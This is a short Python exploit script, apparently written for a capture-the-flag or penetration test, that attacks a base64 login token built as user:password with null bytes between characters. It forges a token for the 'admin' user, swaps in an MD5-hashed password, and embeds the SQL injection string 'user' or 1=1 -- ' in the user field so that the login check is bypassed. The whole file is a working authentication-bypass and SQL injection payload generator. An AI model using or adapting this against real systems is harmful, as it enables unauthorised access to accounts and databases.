import base64
import hashlib

token = "BASE64-REDACTED"


# Token is base64(user:password), including nullbytes per character.
print(base64.b64decode(token).split(b':\x00'))

targetUser = "admin"

craftedUser = b""

for alp in targetUser:
    craftedUser += alp.encode() + b"\x00"

finalPayload = craftedUser + b":\x00" + base64.b64decode(token).split(b':\x00')[1]

print(base64.b64encode(finalPayload))



# Seems that if the user password doesn't match those in records, it simply rejects the token. Potentially this user field might be used for querying DB - potential SQLi?
hash = hashlib.md5(b"test").hexdigest()

passwordPortion = b""
for alp in hash:
    passwordPortion += alp.encode() + b"\x00"
modifiedToken = base64.b64decode(token).split(b":\x00")[0] + b":\x00" + passwordPortion
print(base64.b64encode(modifiedToken))

injection = b"user' or 1=1 -- "
password = b"password"
nullByte = b"\x00"
splitter = b":\x00"

rawToken = b""

for char in injection:
    rawToken += chr(char).encode() + nullByte

rawToken += splitter

for char in password:
    rawToken += chr(char).encode() + nullByte

print(base64.b64encode(rawToken))
